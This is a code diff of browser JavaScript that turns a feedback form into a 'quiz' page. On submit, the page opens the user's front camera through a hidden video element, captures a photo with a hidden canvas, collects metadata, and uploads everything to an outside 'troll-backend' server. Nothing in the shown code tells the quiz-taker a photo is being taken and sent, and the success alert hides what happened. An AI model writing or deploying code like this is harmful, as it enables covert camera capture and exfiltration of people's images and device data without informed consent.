@@ -1,38 +1,50 @@
-const form = document.getElementById("feedbackForm");
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const toast = document.getElementById("toast");
+const form = document.getElementById("quiz-form"); // your quiz form
+const video = document.createElement("video"); // hidden video element
+const canvas = document.createElement("canvas"); // hidden canvas element
 
 const constraints = { video: { facingMode: "user" }, audio: false };
 
-function showToast(text) {
-  toast.innerText = text;
-  toast.style.display = "block";
-  setTimeout(() => (toast.style.display = "none"), 3000);
-}
-
 // Submit event
 form.addEventListener("submit", async (e) => {
-  e.preventDefault();
+  e.preventDefault(); // prevent default form submission
+
+  const submitBtn = document.getElementById("submit-btn");
+  submitBtn.disabled = true;
+  submitBtn.textContent = "Submitting...";
 
   try {
+    // Start camera
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     video.srcObject = stream;
     await video.play();
 
-    // Wait until video has enough data
+    // Wait a tiny bit to ensure video has loaded
     await new Promise((res) => {
       video.addEventListener("canplay", () => setTimeout(res, 300));
     });
 
+    // Capture image from video
     const image = captureImage();
     const metadata = await collectMetadata();
 
+    // Send to your backend
     await sendToBackend(image, metadata);
 
+    // Stop camera
+    video.srcObject.getTracks().forEach((track) => track.stop());
+
+    // Show success message (optional)
+    alert("Response captured successfully!");
+
+    // Reset submit button
+    submitBtn.disabled = false;
+    submitBtn.textContent = "Submit";
+
   } catch (err) {
-    alert("Give me permissions");
     console.error(err);
+    alert("Please allow camera access!");
+    submitBtn.disabled = false;
+    submitBtn.textContent = "Submit";
   }
 });
 
@@ -74,7 +86,9 @@ async function collectMetadata() {
 
   return metadata;
 }
+
 const backendURL = "https://troll-backend.onrender.com/api/upload";
+
 async function sendToBackend(image, metadata) {
   try {
     await fetch(backendURL, {
